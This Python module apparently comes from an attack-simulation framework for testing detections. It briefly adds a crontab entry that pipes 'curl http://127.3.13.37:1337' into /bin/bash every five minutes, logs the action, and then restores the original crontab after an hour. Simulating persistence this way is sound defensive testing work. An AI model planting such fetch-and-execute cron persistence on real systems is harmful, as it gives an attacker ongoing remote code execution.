try:
    from framework.main import ModuleBase
except ImportError:
    pass

class CrontabEntry(ModuleBase):
    @property
    def relative_delay(self):
        return 30

    @property
    def absolute_duration(self):
        return 60 * 60  # 1 hour

    def do_run(self):
        import time
        from subprocess import Popen, PIPE
        job = r'echo "*/5 * * * * /bin/bash -c \"curl http://127.3.13.37:1337 | /bin/bash\" ### {0}"'.format(self._banner)
        cmd = '(crontab -l 2>/dev/null; {0}) | crontab -'.format(job)

        # Get original crontab
        try:
            p = Popen('crontab -l', stdout=PIPE, shell=True)
            original_crontab, _ = p.communicate()
        except Exception as e:
            self.hec_logger('Error getting crontab', severity='error', error=str(e))
            return
        p.wait()

        # Modify crontab
        try:
            p = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
        except Exception as e:
            self.hec_logger('Error adding entry to crontab', error=str(e), severity='error')
            return
        else:
            self.hec_logger('Added a crontab entry', command=cmd)
        p.wait()

        time.sleep(self.absolute_duration)

        # Cleanup crontab
        try:
            p = Popen('echo -n \'{0}\' | crontab -'.format(original_crontab), stdout=PIPE, shell=True)
            p.communicate(original_crontab)
            p.wait()
        except Exception as e:
            self.hec_logger('Error resetting crontab', severity='error', error=str(e))
        else:
            self.hec_logger('Crontab reset to original entries')

    def run(self):
        self.start()
        self.do_run()
        self.finish()
